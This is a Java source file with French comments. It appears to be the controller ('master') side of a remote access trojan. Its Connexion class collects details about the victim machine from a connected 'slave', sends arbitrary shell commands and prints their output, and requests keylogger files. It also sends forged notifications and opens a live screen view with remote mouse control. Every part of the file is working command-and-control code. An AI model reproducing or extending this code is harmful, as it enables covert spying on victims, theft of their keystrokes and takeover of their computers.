package master;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.TimeUnit;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;

import remote.action.BougerSouris;
import remote.action.ClickerSouris;
import remote.action.RemoteActions;
import remote.action.ScreenShot;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.receivedImage;
import constante.Constante;

public class Connexion {

	
	
/**********************************************************************************************************************************************/
/*													   ARGUMENT																	   			   /	
/**********************************************************************************************************************************************/
	private Socket _so;
	private String _ip, _os_name, _numeroConnexion, _pays, _os_arch, _os_version,		// Parametres de la connexion
			_user_name, _file_separator;

	private ObjectInputStream _in;												// Flux d'entrée
	private ObjectOutputStream _out;												// Flux de sortie
	private ArrayBlockingQueue<RemoteActions> _remoteActionsQueue;				// Pour la VNC
	private Affichage _affichage;												// Pour la VNC

	
	
	
	
	/**********************************************************************************************************************************************/
	/*													   CONSTRUCTEUR																	   			   /	
	/**********************************************************************************************************************************************/
	public Connexion(Socket so) throws ClassNotFoundException {
		super();
		this._so = so;
		try {
			_out = new ObjectOutputStream(_so.getOutputStream());					// Ouvre le flux

			_in = new ObjectInputStream(new BufferedInputStream(					// Ouvre le flux
					_so.getInputStream()));
			
			_remoteActionsQueue = new ArrayBlockingQueue<RemoteActions>(20);		// Creer une ArrayList d'arguments
		
			String listInformation = (String) _in.readObject();					// Recupere les parametres de la machine hôte envoyés  par l'esclave
			Server.log.enregistrerFichier("\n" + listInformation);

			String[] splited = listInformation.split("\\s+");					// Affecte les variables aux parametres de la classe
			setFile_separator(splited[1]);
			setUser_name(splited[2]);
			setOs_version(splited[3]);
			setOs_name(splited[4]);
			setOs_arch(splited[5]);
			setPays(splited[6]);
			setIp(so.getInetAddress().toString());
			send();																// Lance un Thread d'envoi
			receive();															// Lance un Thread de reception
		} catch (IOException e) {
			// TODO Auto-generated catch block
		}
	}

	
	/**********************************************************************************************************************************************/
	/*													   METHODES																	   			   /	
	/**********************************************************************************************************************************************/
	
	
	
	
	/**
	 *  	Methode gérant l'interface entre le master et le socket
	 *  	Recupere l'objet a envoyer à l'esclave
	 *  	Socket TCP
	 *  	Envoi d'un code avant l'objet afin de rendre intelligible l'echange entre le maitre et l'esclave
	 *  	 * @throws IOException
	 */
	private void send() throws IOException {
		Thread envoi = new Thread("Envoi") {								// Lance le thread d'envoi
			@Override
			public void run() {
				try {
					while (true) {

						Scanner sc = new Scanner(System.in);				// Pour le nom Graphique
						String commande = sc.nextLine();
						commande = commande.trim();
						if (commande.equals("notif")) {						// Envoyer une notification forgée
							_out.writeObject(Constante.code_notif);
							_out.flush();
						} else if (commande.equals("vnc")) {				// Lancer la VNC
							_affichage = new Affichage(); // Cree un nouvel
															// affichage

						} else if (commande.equals("cmd")) {
							String instruction_a_executer = sc.nextLine();	// Envoyer une commande
							instruction_a_executer = instruction_a_executer
									.trim();
							_out.writeObject(Constante.code_cmd);
							_out.flush();
					//		System.out.println("Envoi d'une requete");
							_out.writeObject(instruction_a_executer);
							_out.flush();
						} else if (commande.equals("quitter")) { // Quitter
							_in.close();
							_out.close();
							System.exit(0);
						} else if (commande.equals("keylog")) {
							// Recuperer un fichier de Keylog
							Server.log.enregistrerFichier(commande);
							_out.writeObject(Constante.code_keylog);
							_out.flush();
						} else {
							Server.log
									.enregistrerFichier("Commande inexistante a executer :"
											+ commande);
						}
					}
				} catch (Exception e) {
					Server.log.enregistrerFichier("Client s'est deconnecte :"
							+ _ip + " " + _user_name);
				}
			}
		};
		envoi.start();
	}

	/**
	 * 		Methode gérant la reception des objets de l'esclave
	 * 
	 */
	public void receive() {
		Thread reception = new Thread() {
			@Override
			public void run() {
				try {
					while (true) {

						Object action = _in.readObject();					// Recupere l'objet
						if (action instanceof Integer) {					// Si c'est un code 
							Integer code = (Integer) action;
							if (code.equals(Constante.code_vnc)) {			// ...un code VNC
								Server.log
										.enregistrerFichier("Recoit une image");
								_affichage.setIcon();						// Fait appelle a la methode de la classe Affichage
							} else if (code.equals(Constante.code_cmd)) {	// ...un  code CMD
								Object object = _in.readObject();
								if (object instanceof String) {
									String res = (String) object;			// Recupere la sortie du terminal
									System.out.println(res);				// L'affiche
								}
							} else {										// Sinon recoit un fichier 
																			// Appelle la methode receivedFile qui recupere le fichier dans le flux de byte
								Server.log
										.enregistrerFichier("Recoit un fichier");
								ReceivedSpecificObject.receivedFile(
										(Integer) action, _in);
							}
						}

						else {
							Server.log
									.enregistrerFichier("Fichier inconnu par le serveur");
						}

					}
				} catch (Exception e) {
					System.out.println(_ip + " s'est deconnecte");

				}
			}
		};
		reception.start();
	}

	public void setIp(String ip) {
		this._ip = ip;
	}

	public Socket getSo() {
		return _so;
	}

	public void setOs_name(String os_name) {
		this._os_name = os_name;
	}

	public void setPays(String pays) {
		this._pays = pays;
	}

	public void setOs_arch(String os_arch) {
		this._os_arch = os_arch;
	}

	public void setOs_version(String os_version) {
		this._os_version = os_version;
	}

	public void setUser_name(String user_name) {
		this._user_name = user_name;
	}

	public void setFile_separator(String file_separator) {
		this._file_separator = file_separator;
	}

	
	
	/**
	 * 			Classe qui se charge de l'affichage de l'ecran de l'esclave 
	 * 			Permet de prendre le controle de la souris, et naviguer sur l'ordinateur de l'esclave
	 * 	 * @author lh
	 */
	class Affichage extends JFrame {
		private final JLabel label = new JLabel();
		private final Timer timer;

		
		
		public Affichage() {

			setTitle(_user_name);									// Parametre de construction de la fenetre
			getContentPane().add(new JScrollPane(label));

			label.addMouseListener(new MouseAdapter() {				// Ajoute un listener sur la souris
				@Override
				public void mouseClicked(MouseEvent e) {
					// TODO Auto-generated method stub
					super.mouseClicked(e);
					try {

						_remoteActionsQueue.put(new BougerSouris(e));		// Si je clique,enregistre dans la RemoteActionsQueue 
																			// une requete pour un deplacement de souris, de clique et d'un nouveau
																			// screenshot
						_remoteActionsQueue.put(new ClickerSouris(e));
						_remoteActionsQueue.put(new ScreenShot());

					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
			});
			setSize(Constante.WINDOW_WIDTH, Constante.WINDOW_HEIGHT);
			setVisible(true);
			Server.log.enregistrerFichier("Ajout d'un listener de la souris");

			timer = new Timer();										// Redemmande un screenshot toutes les 2 secondes pour mettre a jour 
																		// fenetre
			timer.scheduleAtFixedRate(new TimerTask() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {
						_remoteActionsQueue.put(new ScreenShot());
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}, 1, 2000);
			Server.log.enregistrerFichier("Ajout d'un timer");

			Thread envoi = new Thread() {								// Des qu'un nouvel objer apparait dans la liste, se charge de l'envoyer
				@Override
				public void run() {
					while (true) {
						try {
							// System.out.println("[debug] Nouvel objet retire");
							RemoteActions ra = _remoteActionsQueue.poll(3000,
									TimeUnit.MILLISECONDS);
							_out.writeObject(ra);
							_out.flush();
						} catch (InterruptedException | IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
			};
			envoi.start();
			Server.log
					.enregistrerFichier("Ajout d'un thread pour envoyer");

			addWindowListener(new WindowAdapter() {
				@Override
				public void windowClosing(WindowEvent e) {
					// TODO Auto-generated method stub
					super.windowClosing(e);
					timer.cancel();
				}
			});
			Server.log
					.enregistrerFichier("Ajout d'un listener quand on supprime la Windows");

		}
			
		public void setIcon() throws ClassNotFoundException, IOException {		// Modifie l'image de fond 
			// TODO Auto-generated method stub

			final BufferedImage image = receivedImage.receivedImage(_in, true);
			SwingUtilities.invokeLater(new Runnable() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					label.setIcon(new ImageIcon(image));
					// setIconImage(image);
				}
			});
		}
	}

}
